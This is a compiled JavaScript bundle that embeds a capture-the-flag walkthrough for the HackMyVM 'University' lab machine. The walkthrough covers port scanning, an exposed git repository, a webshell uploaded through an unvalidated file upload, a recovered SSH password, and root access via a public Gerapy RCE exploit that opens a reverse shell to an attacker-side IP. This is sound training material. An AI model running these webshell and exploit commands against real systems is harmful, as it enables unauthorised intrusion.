(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["about"],{"02ea":function(e,t,s){e.exports=s.p+"img/ss2.1ba3ae01.png"},"2eec":function(e,t,s){"use strict";s("8c38")},"3b8b":function(e,t,s){e.exports=s.p+"img/ss0.bced7a1f.png"},"5ba2":function(e,t,s){e.exports=s.p+"img/ss4.efee9480.png"},"762c":function(e,t,s){"use strict";s.r(t);var a=function(){var e=this,t=e.$createElement;e._self._c;return e._m(0)},n=[function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("div",{staticClass:"report"},[a("div",{staticClass:"container"},[a("h1",{attrs:{id:"university"}},[e._v(" University ")]),a("p",[e._v("This is a vulnerable VM uploaded to HackMyVM on January 19, 2022. You may find its page "),a("a",{attrs:{href:"https://hackmyvm.eu/machines/machine.php?vm=University"}},[e._v("here")]),e._v(".")]),a("p",[e._v("I’ve made an entry in my "),a("code",[e._v("/etc/hosts")]),e._v(" file for "),a("code",[e._v("university.local")]),e._v(". It refers to the IP address of the machine, for ease of use.")]),a("h2",{attrs:{id:"process"}},[e._v(" Process ")]),a("h3",{attrs:{id:"initial-scans"}},[e._v(" Initial Scans ")]),a("p",[e._v("As always, start out with an "),a("code",[e._v("nmap")]),e._v(" scan, to see what ports are open:")]),a("pre",[a("code",[e._v("Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 21:05 MST\nNmap scan report for university.local (172.16.231.143)\nHost is up (0.00068s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)\n80/tcp open  http    nginx 1.18.0\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.90 seconds")])]),a("p",[e._v("Ports 22 and 80 are open, and no others. We shouldn’t have to look too far to get in.")]),a("p",[e._v("Port 80 is an nginx service with a pretty ugly website.")]),a("p",[a("img",{attrs:{src:s("3b8b")}})]),a("p",[e._v("A quick nikto scan:")]),a("pre",[a("code",[e._v("- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          172.16.231.143\n+ Target Hostname:    university.local\n+ Target Port:        80\n+ Start Time:         2022-01-31 13:36:41 (GMT-7)\n---------------------------------------------------------------------------\n+ Server: nginx/1.18.0\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n+ Cookie PHPSESSID created without the httponly flag\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.\n+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.\n+ OSVDB-3092: /admin.php: This might be interesting...\n+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.\n+ /.git/HEAD: Git HEAD file found. Full repo details may be present.\n+ /.git/config: Git config file found. Infos about repo details may be present.\n+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.\n+ 7785 requests: 0 error(s) and 11 item(s) reported on remote host\n+ End Time:           2022-01-31 13:36:53 (GMT-7) (12 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested")])]),a("p",[e._v("This shows us some good data, but the true gem here is the "),a("code",[e._v("/.git/config")]),e._v(" file. This is a git repo. Here’s the contents of that file:")]),a("pre",[a("code",[e._v('[core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n    logallrefupdates = true\n[remote "origin"]\n    url = https://github.com/rskoolrash/Online-Admission-System\n    fetch = +refs/heads/*:refs/remotes/origin/*\n[branch "master"]\n    remote = origin\n    merge = refs/heads/master\n')])]),a("p",[e._v("The url takes us to a GitHub-hosted repo, "),a("a",{attrs:{href:"https://github.com/rskoolrash/Online-Admission-System"}},[e._v("Online Admission System")]),e._v(". This gives us an accurate read of the file structure, and all the source code. Easy mode: on.")]),a("h3",{attrs:{id:"getting-user"}},[e._v(" Getting User ")]),a("p",[e._v("We can poke around in some of the files. "),a("code",[e._v("index.php")]),e._v(" looks vulnerable to SQL injection, but I can’t seem to get it to trigger.")]),a("p",[e._v("There’s also a "),a("code",[e._v("fileupload.php")]),e._v(", included within "),a("code",[e._v("documents.php")]),e._v(". The files uploaded here aren’t validated worth anything. Let’s try it out.")]),a("p",[e._v("Generate a PHP webshell:")]),a("div",{staticClass:"sourceCode",attrs:{id:"cb4"}},[a("pre",{staticClass:"sourceCode bash"},[a("code",{staticClass:"sourceCode bash"},[a("span",{attrs:{id:"cb4-1"}},[a("a",{attrs:{href:"#cb4-1","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"ex"},[e._v("weevely")]),e._v(" generate mIvQtTGm webshell.php")])])])]),a("p",[e._v("Upload it to the site:")]),a("p",[a("img",{attrs:{src:s("c40c")}})]),a("p",[e._v("Access the webshell:")]),a("div",{staticClass:"sourceCode",attrs:{id:"cb5"}},[a("pre",{staticClass:"sourceCode bash"},[a("code",{staticClass:"sourceCode bash"},[a("span",{attrs:{id:"cb5-1"}},[a("a",{attrs:{href:"#cb5-1","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"ex"},[e._v("weevely")]),e._v(" http://university.local/studentpic/webshell.php mIvQtTGm")])])])]),a("p",[e._v("This gives us a shell. We can see that nothing has changed in this git repo (except our upload) with "),a("code",[e._v("git status")]),e._v(". Stepping just outside the web root, we can see a hidden file called "),a("code",[e._v(".sandra_secret")]),e._v(". Contents are "),a("code",[e._v("Myyogaiseasy")]),e._v(". Trying out "),a("code",[e._v("sandra:Myyogaiseasy")]),e._v(" over SSH gets us in.")]),a("div",{staticClass:"sourceCode",attrs:{id:"cb6"}},[a("pre",{staticClass:"sourceCode bash"},[a("code",{staticClass:"sourceCode bash"},[a("span",{attrs:{id:"cb6-1"}},[a("a",{attrs:{href:"#cb6-1","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"fu"},[e._v("cat")]),e._v(" ~/user.txt")])])])]),a("p",[e._v("Outputs:")]),a("pre",[a("code",[e._v("HMV094REDACTED25HMV")])]),a("p",[a("img",{attrs:{src:s("02ea")}})]),a("h3",{attrs:{id:"getting-root"}},[e._v(" Getting Root ")]),a("p",[e._v("Running "),a("code",[e._v("sudo -l")]),e._v(" shows us that Sandra can run "),a("code",[e._v("gerapy")]),e._v(" as root. I’ve never heard of this before. A quick Duck shows us that it is a “Distributed Crawler Management Framework Based on Scrapy, Scrapyd, Scrapyd-Client, Scrapyd-API, Django and Vue.js.”. So it helps web crawlers collaborate. Pretty boring, and "),a("a",{attrs:{href:"https://gtfobins.github.io/"}},[e._v("GTFOBins")]),e._v(" doesn’t mention it.")]),a("p",[e._v("Exploit Database has a single entry, for Gerapy 0.9.7, that allows for authenticated remote code execution. Time to download and run unvetted code!")]),a("p",[e._v("The code needs a running server, and it also needs a “project” to already exist. Getting that started is simple:")]),a("div",{staticClass:"sourceCode",attrs:{id:"cb8"}},[a("pre",{staticClass:"sourceCode bash"},[a("code",{staticClass:"sourceCode bash"},[a("span",{attrs:{id:"cb8-1"}},[a("a",{attrs:{href:"#cb8-1","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"co"},[e._v("# On remote, as Sandra")])]),e._v("\n"),a("span",{attrs:{id:"cb8-2"}},[a("a",{attrs:{href:"#cb8-2","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"fu"},[e._v("sudo")]),e._v(" gerapy init")]),e._v("\n"),a("span",{attrs:{id:"cb8-3"}},[a("a",{attrs:{href:"#cb8-3","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"bu"},[e._v("cd")]),e._v(" gerapy")]),e._v("\n"),a("span",{attrs:{id:"cb8-4"}},[a("a",{attrs:{href:"#cb8-4","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"fu"},[e._v("sudo")]),e._v(" gerapy migrate")]),e._v("\n"),a("span",{attrs:{id:"cb8-5"}},[a("a",{attrs:{href:"#cb8-5","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"fu"},[e._v("sudo")]),e._v(" gerapy initadmin")]),e._v("\n"),a("span",{attrs:{id:"cb8-6"}},[a("a",{attrs:{href:"#cb8-6","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"fu"},[e._v("sudo")]),e._v(" gerapy runserver 0.0.0.0:8000")])])])]),a("p",[e._v("Then log in through the browser and create a project.")]),a("p",[a("img",{attrs:{src:s("7f60")}})]),a("p",[e._v("Running the exploit is simple:")]),a("div",{staticClass:"sourceCode",attrs:{id:"cb9"}},[a("pre",{staticClass:"sourceCode bash"},[a("code",{staticClass:"sourceCode bash"},[a("span",{attrs:{id:"cb9-1"}},[a("a",{attrs:{href:"#cb9-1","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"ex"},[e._v("python3")]),e._v(" exploit.py "),a("span",{staticClass:"at"},[e._v("-t")]),e._v(" university.local "),a("span",{staticClass:"at"},[e._v("-p")]),e._v(" 8000 "),a("span",{staticClass:"at"},[e._v("-L")]),e._v(" 172.16.231.130 "),a("span",{staticClass:"at"},[e._v("-P")]),e._v(" 9000")])])])]),a("p",[e._v("This spawns a shell as "),a("code",[e._v("root")]),e._v(".")]),a("div",{staticClass:"sourceCode",attrs:{id:"cb10"}},[a("pre",{staticClass:"sourceCode bash"},[a("code",{staticClass:"sourceCode bash"},[a("span",{attrs:{id:"cb10-1"}},[a("a",{attrs:{href:"#cb10-1","aria-hidden":"true",tabindex:"-1"}}),a("span",{staticClass:"fu"},[e._v("cat")]),e._v(" ~/root.txt")])])])]),a("p",[e._v("Outputs:")]),a("pre",[a("code",[e._v("HMV111REDACTED87HMV")])]),a("p",[a("img",{attrs:{src:s("5ba2")}})])])])}],i=(s("2eec"),s("2877")),r={},o=Object(i["a"])(r,a,n,!1,null,"7f980baa",null);t["default"]=o.exports},"7f60":function(e,t,s){e.exports=s.p+"img/ss3.ee0ab90b.png"},"8c38":function(e,t,s){},c40c:function(e,t,s){e.exports=s.p+"img/ss1.8cdb3e80.png"},f820:function(e,t,s){"use strict";s.r(t);var a=function(){var e=this,t=e.$createElement;e._self._c;return e._m(0)},n=[function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("div",{staticClass:"about"},[s("h1",[e._v("This is an about page")])])}],i=s("2877"),r={},o=Object(i["a"])(r,a,n,!1,null,null,null);t["default"]=o.exports}}]);
//# sourceMappingURL=about.dc184577.js.map